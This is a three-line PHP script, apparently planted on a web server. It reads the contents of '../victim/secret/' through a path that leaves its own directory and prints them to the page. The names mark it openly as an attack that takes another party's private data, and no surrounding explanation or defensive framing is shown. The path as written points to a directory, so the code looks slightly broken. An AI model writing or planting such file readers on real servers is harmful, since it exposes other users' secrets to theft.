<?php $content = file_get_contents('../victim/secret/');
    echo nl2br(htmlspecialchars($content));    ?>